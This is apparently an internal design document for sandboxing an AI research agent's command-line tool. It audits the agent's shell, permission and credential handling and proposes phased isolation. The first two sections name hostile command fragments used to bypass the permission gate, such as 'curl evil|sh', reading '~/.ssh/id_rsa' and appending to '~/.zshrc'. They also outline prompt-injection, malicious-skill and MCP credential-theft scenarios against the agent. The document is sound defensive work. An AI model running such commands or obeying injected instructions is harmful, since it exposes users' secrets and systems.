# 10 — Agent sandboxing (design only)

**STATUS: DESIGN ONLY — needs owner go/no-go before any isolation is built.** Read-only investigation; nothing implemented. Citations `file:line` under `backend/cli/src`.

There is **no existing sandbox/isolation primitive** in the codebase (grep for seatbelt/landlock/seccomp/firejail/gvisor/chroot/cgroup → nothing; the word "sandbox" in `project/project.ts` is just a name for the git worktree root).

## 1. Current execution model (the reality behind the SECURITY.md framing)

**The shell tool** (`tool/bash.ts:168-174`) spawns via Node `child_process.spawn` with `shell` (the user's `$SHELL` unless fish/nu, `shell/shell.ts:74-78`), `cwd = params.workdir || Instance.directory` (**model-controlled, any absolute path accepted**, `bash.ts:79`), `env = HYscience.subprocessEnv(process.env)`, and — crucially — **`DEFAULT_TIMEOUT = 0` ⇒ no timeout by default** (`bash.ts:22,89,227-233`). The child runs as the **same uid/gid** as HYscience with full ambient authority — no namespace, seccomp, rlimit, cwd jail, or network restriction. The only pre-exec gate is a tree-sitter parse that, for a **hardcoded 9-command list** (`cd rm cp mv mkdir touch chmod chown cat`, `bash.ts:118`), `realpath`s args and asks `external_directory` for out-of-project paths — **advisory and trivially bypassed** (`head ~/.ssh/id_rsa`, `python -c`, `curl|sh`, `echo >> ~/.zshrc`, a variable-indirected path all evade it).

**File tools** (`edit/write/read`) resolve against `Instance.directory` and do a real `external_directory` ask when the path is outside the project (`tool/external-directory.ts:12-32`) — but it's a _prompt_, not a wall, and doesn't cover bash.

**The permission system** (`permission/next.ts`, the live one) is last-match-wins over `{permission, pattern, action}` rules; default is `ask`. **But the shipped default policy is `"*": "allow"`** (`agent/agent.ts:55-74`) with only `mcp: ask`, `external_directory: ask`, `read *.env: ask`, `doom_loop: ask` carved out. **Consequence: out of the box, in-project `bash`/`webfetch`/`edit`/`write` never prompt.** So "the human sees every command" is **false** under shipped defaults — only out-of-project ops and MCP calls prompt. Approvals are **in-memory only** (the disk write is a TODO, `next.ts:223-225`), so "always allow" doesn't survive a restart.

**Credentials** (`hyscience/index.ts`): `filterEnvForSubprocess` (`:935-947`) is a **denylist** — it strips `thk_` values + the 4 `SHARED_PROVIDER_KEYS`, so **everything it doesn't name (`AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, `DATABASE_URL`, `SSH_AUTH_SOCK`, …) passes through to bash**. `mergeByokEnv` (`:970-982`) _adds_ user BYOK provider keys into bash by design. `redactSecrets` masks only _known_ values in echoed output (not exfil). **MCP asymmetry (worst hole): local MCP servers are spawned with the full unfiltered `process.env` including every provider key AND the `thk_` wallet key** (`mcp/index.ts:398-408`).

**What one tool call can reach today:** entire-user-account filesystem read/write, arbitrary process exec (full shell, unbounded time), arbitrary network egress (no allowlist), all shell secrets in env (+ full env for MCP), unlimited resources, persistence (login scripts/cron/hooks). Stopped by: partial `external_directory` prompts (bypassable) and a 4-key env denylist for bash only.

## 2. Threat model

Trust boundary today: the prompt keeps the human _aware_, is explicitly **not** isolation; MCP/config are out of scope. Concrete scenarios, each "what the adversary achieves → what stops it now":

- **T1 Indirect prompt injection** — untrusted text (`webfetch` page, fetched PDF, cloned README, dataset, bash output, MCP result) carries instructions; default-allow bash means `curl evil|sh` / exfil runs **with no prompt**. Stops it: essentially nothing in-project.
- **T2 Malicious skill** — skill body is followed; only a light regex scrub of "always run" directives (`tool/skill.ts:146-183`). Stops it: trivial-to-evade regex.
- **T3 Malicious MCP** — the MCP process gets the **full env (provider + `thk_` keys)** and can phone them home directly; its outputs are an injection channel. Stops it: `mcp: ask` on _calls_ (one-click "always"); nothing on its env/network.
- **T4 Destructive fs** — in-project `rm -rf` unprompted; out-of-project only caught for the 9-command list with static paths. Stops it: partial ask; edit-snapshots revert _edits_ not `rm`.
- **T5 Egress/exfil** — no egress policy; any readable secret leaves in one request. Stops it: nothing.
- **T6 Persistence** — `echo >> ~/.zshrc`, cron, git hooks; bash-append not in the AST list. Stops it: partial ask.
- **T7 Credential theft + lateral movement** — read `auth.json`/`~/.aws`/`~/.ssh`/`.git-credentials`, harvest passthrough env (the research flow legitimately holds HF/W&B/Modal/cloud tokens, `SAFE_SYNCED_KEYS`), reuse to reach cloud/CI/other repos. Stops it: 4-key denylist for bash; nothing for MCP.

**Net:** for anyone running HYscience against an untrusted repo/paper/dataset, or with any untrusted skill/MCP, there is no effective containment.

## 3. Isolation options (trade-offs for this stack)

Constraints: local, single Bun native binary, cross-platform (macOS+Linux+Windows), research UX that legitimately needs shell + outbound network + GPU. So isolation must be **opt-in and porous by policy**, not all-or-nothing.

- **Containers (Docker/Podman)** — strong, ephemeral fs, natural credential scoping, GPU easy on Linux. But heavy dep (absent on most macOS/Windows dev machines), GPU painful on macOS, mount perf/UID friction, conflicts with "just run the binary." → **opt-in "container mode," not default.** Firecracker microVM = Linux/KVM-only, too heavy (future _remote_ backend only). gVisor = Linux-only, syscall-compat gaps that bite ML toolchains → low priority.
- **Kernel primitives (per-subprocess, no container):** **Linux** Landlock + seccomp-bpf + namespaces (or **bubblewrap** ready-made unprivileged) — confine fs to project+tmp, deny `~/.ssh`/`~/.aws`/config, restrict syscalls/net, preserve GPU; **highest-ROI real boundary on Linux**. **macOS** Seatbelt (`sandbox-exec`/`sandbox_init`) — ships with the OS, allow project+tmp / deny home+creds / scope network (the mechanism other coding agents use); `sandbox-exec` is technically deprecated but present and widely used. **Windows** AppContainer + Job Objects + restricted tokens — weakest (no native bash; commands run under Git-Bash/cmd); likely start with Job-Object resource caps + "use WSL2/container for real isolation." **Honest gap: Linux ≫ macOS > Windows**; expose per-platform backends behind one policy interface and be explicit about what each enforces.
- **Network egress policy** (independent, high value): local filtering proxy + `HTTP(S)_PROXY`/`NO_PROXY` + `webfetch` honoring it (cheap, cross-platform, bypassable by raw sockets), or kernel/namespace enforcement (unbypassable). Default allowlist = the science DBs HYscience already ships + package registries + configured provider/compute hosts; else `ask`.
- **Filesystem scoping**: per-session ephemeral workdir (reuse the opt-in git-worktree plumbing, `worktree/index.ts:292`); bind/overlay mounts on Linux; make the existing `containsPath` project boundary an actual wall instead of a prompt hint.
- **Resource limits**: Linux cgroups v2 / `setrlimit`; macOS `ulimit`; Windows Job Objects; plus a **default bash timeout** (trivial — `DEFAULT_TIMEOUT` is already the hook, `bash.ts:22`).
- **Credential isolation (cheapest, largest win):** flip `filterEnvForSubprocess` denylist→allowlist (`:935-947`); make BYOK-into-bash opt-in (`mergeByokEnv`); **fix the MCP env leak** (route MCP through the filtered env, `mcp/index.ts:403`); eventually a localhost credential broker that injects short-lived creds per approved call.

## 4. Recommendation — phased, opt-in, reversible (don't change shipped defaults early)

**Phase 1 — Credential isolation (do first; cheap, cross-platform, no UX cost, pure in-process):**

1. **MCP env parity** — filter MCP env like bash (`mcp/index.ts:403` → `subprocessEnv`). Closes the widest hole (T3a/T7). Behind a flag, default-on once validated.
2. **Env allowlist** — convert `filterEnvForSubprocess` to allowlist semantics, behind `HYSCIENCE_SANDBOX_ENV_ALLOWLIST` to validate against real skills first.
3. **BYOK injection opt-in** — gate `mergeByokEnv`.
4. **Default bash timeout** — set a sane non-zero `DEFAULT_TIMEOUT`.

**Phase 2 — Filesystem scoping + egress policy (opt-in "guarded mode"):** 5. Real project-boundary enforcement for the bash child — Linux bubblewrap/Landlock, macOS generated Seatbelt profile; confine writes to project+tmp, mask cred dirs; preserve GPU + general reads. 6. Network egress allowlist via local proxy (default = science DBs + provider/compute hosts, else `ask`); kernel-level enforcement as follow-up. 7. Per-session ephemeral workdir option.

**Phase 3 — Opt-in OS sandbox profiles + container mode:** one `Sandbox` policy interface, per-platform backends; "sandboxed" badge in the workspace; Docker/Podman strong tier with Linux GPU passthrough.

**"Sandboxed mode" without breaking research:** project+`/tmp` read-write / system read-only / cred dirs masked; allowlisted egress passes, other `ask`; env allowlist + no BYOK-in-bash unless requested + MCP filtered; default cpu/mem/pids caps + timeout; **GPU preserved**; and the existing permission `ask` becomes a genuine "step outside the sandbox for this one action" control — finally making the prompt an isolation boundary, not a notification.

**Feasibility spike (small, safe, reversible — ships nothing irreversible):**

1. A no-op `Sandbox.wrap(spawnArgs, policy)` seam around the single `spawn` (`bash.ts:168`); default = passthrough (identical behavior). Pure refactor, revertible.
2. One backend, flag-gated (`HYSCIENCE_EXPERIMENTAL_SANDBOX`): macOS `sandbox-exec` + generated profile; Linux `bubblewrap` **iff present** else no-op-with-log. Never fail closed if the primitive is missing.
3. `--print-sandbox-profile` dry-run that emits the profile/args and exits — owner reviews exactly what would be enforced, zero execution.
4. Prototype the env allowlist behind its own flag; diff against real skill runs to find breakage before proposing a default flip.
5. Validate: run the `research` agent through a normal loop (clone, pip install, run a script, hit a science DB, write results) flag on/off — parity when off, containment when on. No default changes, no persisted state.

## 5. Open decisions for the owner (go / no-go)

1. **Default posture** — opt-in indefinitely, or graduate a minimal profile to default-on once stable? (Rec: opt-in through Phase 2.)
2. **Credential-injection change (P1.2/1.3)** — OK to flip env passthrough to an allowlist and stop injecting BYOK into bash by default, accepting some skills may need updating? (Highest ROI, most likely UX fallout.)
3. **MCP env filtering (P1.1)** — OK to stop handing full `process.env` (incl. provider + `thk_`) to MCP servers by default? Identify any first-party MCP that relies on it first.
4. **Container dependency** — ship an opt-in Docker/Podman mode (heavy dep), or in-binary kernel primitives only?
5. **Cross-platform parity** — accept explicitly unequal guarantees (Linux strong, macOS medium, Windows weak → "use WSL2/container"), or hold sandboxed mode until Windows matches?
6. **GPU / network defaults inside the sandbox** — confirm GPU always passes through and default egress = (science DBs + provider + compute) with other egress `ask` not `deny`.
7. **Managed / Atlas implications** — does sandboxed mode interact with the `thk_` wallet flow / managed compute in a way Atlas must sign off on?
8. **Headless / CI behavior** — in `serve`/ACP with no human to answer `ask`, fail-closed (deny) or run fully unattended?
9. **Permission persistence** — ship the currently-disabled on-disk ruleset store (`next.ts:223-225`) so "always allow" + sandbox policy survive restarts?
10. **Docs/threat-model update** — update `SECURITY.md`/`README.md` to state plainly that in-project bash/edit/network are **unprompted by default** today, before any of this ships.

## Risks

The research UX depends on unattended in-project bash + network + GPU; isolation that breaks any of those by default will be rejected → additive/opt-in only. Sequencing matters: don't wire a backend proxy before credential single-source-of-truth. macOS/Windows can't match Linux — don't promise uniform isolation.

**Key files:** `tool/bash.ts:168` (spawn), `shell/shell.ts`, `tool/{edit,write,read,external-directory}.ts`, `project/instance.ts:62`, `permission/next.ts`, `session/prompt.ts:785`, `agent/agent.ts:55`, `config/config.ts:574`, `hyscience/index.ts:935/970/988/903`, `mcp/index.ts:398`, `worktree/index.ts:292`, `server/server.ts:237`, `acp/agent.ts:67`.
